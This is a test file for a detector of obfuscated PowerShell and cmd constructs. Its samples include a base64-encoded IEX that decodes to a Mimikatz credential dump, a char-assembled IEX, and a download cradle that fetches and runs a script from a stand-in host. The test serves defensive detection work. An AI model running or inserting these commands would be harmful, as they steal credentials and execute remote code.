import { describe, it, expect } from 'vitest'
import { detectResidue } from '../residue'

describe('detectResidue — unresolved constructs become findings', () => {
  it('R1: a base64 literal fed to a decode API is flagged', () => {
    const t = "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b2tlLU1pbWlrYXR6IC1EdW1wQ3JlZHM=')))"
    const r = detectResidue(t, 'powershell')
    expect(r.map((f) => f.construct)).toContain('base64')
    expect(r[0].bytes).toBeGreaterThan(0)
  })
  it('R2: a dynamic sink over an unresolved -join/[char] construct is flagged', () => {
    const t = "IEX (( [char]73,[char]69,[char]88 ) -join '')"
    expect(detectResidue(t, 'powershell').map((f) => f.construct)).toContain('char-assembly')
  })
  it('R4: a cmd %VAR:~n,m% substring construct is flagged (cmd interpreter only)', () => {
    const t = '%COMSPEC:~0,1%'
    expect(detectResidue(t, 'cmd').map((f) => f.construct)).toContain('cmd-var')
  })

  // benign twins — MUST stay silent
  it('does not fire on a plain fetch cradle (download-cradle handles it)', () => {
    const t = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a.ps1')"
    expect(detectResidue(t, 'powershell')).toEqual([])
  })
  it('does not fire on an already-resolved literal executed by IEX', () => {
    expect(detectResidue("IEX 'Get-Process'", 'powershell')).toEqual([])
  })
  it('does not fire on benign admin work', () => {
    expect(detectResidue('Get-ChildItem -Recurse | Where Length -gt 1MB', 'powershell')).toEqual([])
  })
  it('does not fire on a bare %PATH% (not a substring/reassembly construct)', () => {
    expect(detectResidue('echo %PATH%', 'cmd')).toEqual([])
  })
})
